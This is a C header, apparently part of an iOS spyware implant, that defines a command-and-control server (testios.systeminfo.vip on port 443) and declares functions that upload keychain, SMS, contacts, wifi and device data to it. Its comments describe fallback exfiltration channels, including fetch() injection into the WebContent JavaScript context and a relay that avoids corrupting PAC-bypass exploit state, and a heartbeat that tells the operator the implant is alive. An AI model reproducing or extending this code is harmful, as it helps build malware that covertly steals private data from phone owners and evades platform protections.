#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <stddef.h>

#define C2_DOMAIN    "testios.systeminfo.vip"
#define C2_PORT      443
#define C2_USE_HTTPS 1          /* 1 = HTTPS, 0 = HTTP */
#define C2_UPLOAD    "/upload"

/*
 * Payload version — bump the sub-version on every build that changes dylib
 * behaviour so the operator can confirm which version is running on-device.
 * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
 */
#define PAYLOAD_VERSION "1.7"

/*
 * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
 *   category    : e.g. "keychain", "sms", "contacts", "wifi", "system"
 *   path        : source path on device, e.g. "/var/mobile/Library/SMS/sms.db"
 *   description : human-readable label
 *   b64data     : base64-encoded payload bytes
 *
 * Upload channel priority (each falls back to the next on failure):
 *   C — JSContext fetch() injection (WebContent JS thread / saved context)
 *   B — raw POSIX socket + SecureTransport TLS
 *   A — NSURLSession (blocked in WebContent, used outside WebContent)
 *   D2 — window.__d1_q push via JSContext (upload_beacon only); Stage3 reads
 *        the plain JS array and relays via XHR without exploit primitives.
 *        Fixes v1.5/v1.6 regression on iOS 15.4.1 (ep.read32 after Pt()
 *        corrupted PAC-bypass state → outcome=fail).
 */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data);

/*
 * upload_beacon — synchronous diagnostic probe called from process().
 *
 * Channel priority: C → B → A → D2 (window.__d1_q push).
 *
 * v1.7: Channel D2 replaces D1 (cru_queue kernel-read relay).
 *   Stage3 reads window.__d1_q (plain JS array) instead of g_cru_q[]
 *   via exploitPrimitive.read32, preventing PAC-bypass state corruption.
 *
 * Log signatures:
 *   cat=system path=/coruna/beacon desc has "(jsc)"  → Channel C
 *   cat=system path=/coruna/beacon desc has no tag   → Channel B or A
 *   Stage3 logs "[D2] relay cnt=1"                   → Channel D2 relay
 *   No beacon at all                                 → all channels failed
 */
void upload_beacon(void);

/* One-shot device info upload (iOS version, model, kernel version) */
void upload_device_info(void);

/* Heartbeat — lets C2 know the implant is alive */
void c2_heartbeat(void);

/* Legacy stub kept for ABI compat with any old callers */
void send_to_c2(const uint8_t *data, size_t len);

#endif /* C2_H */
